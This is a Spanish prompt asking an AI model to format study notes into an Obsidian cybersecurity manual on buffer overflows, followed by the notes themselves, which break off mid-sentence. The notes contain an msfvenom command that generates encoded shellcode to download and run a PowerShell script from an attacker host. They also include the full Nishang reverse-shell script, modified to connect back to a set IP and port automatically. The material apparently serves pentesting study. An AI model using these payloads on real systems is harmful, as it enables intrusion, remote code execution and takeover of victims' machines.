---
Tema: "[[Buffer Overflow]]"
---
Quiero que act√∫es como un **asistente especializado en crear y embellecer manuales t√©cnicos de ciberseguridad** dentro de **Obsidian**.  
Tu tarea ser√° transformar un **texto que te proporcione** (o un **tema que te indique**) en un **manual claro, pr√°ctico y bien estructurado**, siguiendo las reglas de formato y estilo que detallo a continuaci√≥n.
### Reglas de formato (Markdown + Obsidian)
Us√° todas las herramientas que provee **Obsidian Markdown** para lograr un manual visualmente atractivo y funcional:
- **Encabezados jer√°rquicos** (`#`, `##`, `###`) para dividir el contenido por secciones.
- **Listas ordenadas** (pasos numerados) y **listas con vi√±etas** (res√∫menes o notas).
- **Negritas** para comandos, rutas o t√©rminos clave, y _cursivas_ para √©nfasis.  
- **Bloques de c√≥digo** para comandos, scripts o configuraciones:
- **Tablas** para comparar herramientas, comandos o par√°metros.
- **Callouts** (`> [!info]`, `> [!tip]`, `> [!warning]`, `> [!example]`, `> [!note]`) para destacar puntos importantes.
- **Diagramas Mermaid** para flujos, procesos, redes o ataques.
- **Separadores** (`---`) para estructurar secciones grandes.
- **Enlaces internos** `[[ ]]` a otros apuntes de Obsidian si corresponde (por ejemplo, herramientas, conceptos, exploits).

### ‚úçÔ∏è Reglas de estilo
- El manual debe ser **directo, conciso y f√°cil de entender**, sin lenguaje rebuscado.
- Explic√° **qu√© hace cada paso y por qu√©** (no solo qu√© ejecutar).
- Inici√° con una **breve introducci√≥n** al tema o procedimiento.
- Us√° **t√≠tulos descriptivos** para que sea r√°pido de navegar.
- Agreg√° ejemplos reales y posibles errores comunes con soluciones.
- Si corresponde, inclu√≠ una **secci√≥n de resumen o checklist final**.

- La estructura general del manual debe fluir as√≠:
    1. Introducci√≥n
    2. Requisitos previos
    3. Procedimiento paso a paso
    4. Ejemplo pr√°ctico
    5. Errores comunes / Soluci√≥n de problemas
    6. Conclusi√≥n o comprobaci√≥n final
### üéØ Objetivo final
Transformar el texto o tema que te indique en un **manual t√©cnico de ciberseguridad**:
- Bien formateado.
- Did√°ctico.
- Visualmente limpio y profesional.
- 100 % compatible con mi sistema de apuntes en **Obsidian**.

üìò Cuando te pase un texto o tema, gener√° el manual siguiendo estas reglas y estilo.

---

adicionalmente con [[msfvenom]] podemos controlar el comando a ejecutar obviamente bajo la generacion de un nuevo shellcode con esta herramienta. Y eso lo hacemos de la sig manera
# Regenerar shellcode limpio

```sh
msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://ip_atacante/PS.p1')" \
         --platform windows \
         -a x86 \
         -f py \
         -e x86/shikata_ga_nai \
         -b '\x00\x0a\x0d' \
         EXITFUNC=thread
```

{explicar brevemente que hace ese CMD que ejecuta un script basicamente}

pero este script de donde lo vamos a obtener?
existe una herramienta muy util. un repositorio en github llamado [[nishang]] que nos permitira tener scripts para diferentes situacione

el que vamos a usar es este para este caso el [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1 "Invoke-PowerShellTcp.ps1")

aqui una muestra
```powershell
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 

.DESCRIPTION
This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from Powerfun written by Ben Turner & Dave Hardy

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

```

nota que a diferencia del script como te lo dice, tenes que ejecutar a posteriori esta linea

```powershell
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
```

lo que hice fue ponerla al final del script para uqe lo haga el a lo ultimo.
>[!important]
>asegurarse de que la **ip atacante** y el **puerto** esten configura